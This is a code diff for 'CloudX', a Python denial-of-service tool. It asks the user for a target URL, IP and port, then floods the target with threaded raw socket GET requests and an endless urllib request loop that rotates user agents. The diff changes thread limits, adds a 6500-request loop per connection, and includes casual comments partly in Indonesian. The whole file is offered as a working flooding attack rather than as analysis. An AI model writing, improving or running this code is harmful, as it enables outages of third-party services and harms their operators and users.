@@ -4,13 +4,14 @@ import sys
 import urllib.request
 import urllib.error
 import random
-
+import os
+import time
+os.system('clear')
 print("POST Method is currently being fixed and it is error right now, please use GET instead.")
 logo="""
 < =============== >
       CloudX
 ^ <=============> ^
-
 """
 print(logo)
 
@@ -20,24 +21,25 @@ ip = ""
 port = ""
 threads = ""
 method = ""
-maxThreads = int(50000)
+maxThreads = int(35999)
 
 url = input("[+] Enter a URL to attack: ")
 ip = input("[+] Enter the target IP address: ")
 port = input("[+] Enter the target port (default: 80): ")
 numberOfThreads = input("[+] Enter the desired number of threads (default: 16500): ")
 method = input("[+] Enter either 'GET' or 'POST' as the request method (default: GET): ")
-
+print("[Check Traffic!]")
+time.sleep(0.5)
 if port == "":
     port = str(80)
 if numberOfThreads == "":
-    numberOfThreads = int(16500)
+    numberOfThreads = int(17500)
 if maxThreads < int(numberOfThreads):
     numberOfThreads = int(maxThreads)
 if method == "":
     method = "GET"
 
-# Construct attack parameters
+# Construct attack parameters ( User Agen nya broo )
 headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
@@ -90,22 +92,16 @@ def attack(ip, port, threadNum):
                 print("[*] Thread (%s) | Attack Sent!" % (threadNum))
             else:
                 s.connect((ip, int(port)))
-                s.sendto(("GET /%s HTTP/1.1\r\n" % (url)).encode('utf-8'), (ip, int(port)))
-                s.sendto("Host: %s\r\n\r\n" % (url), (ip, int(port)))
+                for _ in range(6500):
+                    s.send(("GET /%s HTTP/1.1\r\n" % (url)).encode('utf-8'))
+                    s.send("Host: %s\r\n\r\n" % (url))
                 s.close()
                 print("[*] Thread (%s) | Attack Sent!" % (threadNum))
         except urllib.error.URLError as e:
             print("[*] Thread (%s) | URL or IP not valid!" % (threadNum))
             print("[*] Thread (%s) | Attack stopped." % (threadNum))
             break
-for i in range(int(numberOfThreads)):
-    threading.Thread(target=attack, args=(ip,port,i)).start()
-    if i >= 50000:
-        sys.exit()
 
-print("[+] DDos attack started! Enjoy your 'boom' responsibly! 💣🔥")
-
-# Function to flood the target URL with a random user agent
 def flood_url():
     while True:
         user_agent = ' '.join([random.choice(v['name']) for k, v in USER_AGENT_PARTS['os'].items()])
@@ -118,5 +114,10 @@ def flood_url():
         request = urllib.request.Request(url, None, headers)
         urllib.request.urlopen(request)
 
-# Start flooding the URL
+# Mulai ( start flooding )
 threading.Thread(target=flood_url).start()
+
+#NOTE
+"""
+CloudX is under development so dont have high expectations about this. alright?
+"""
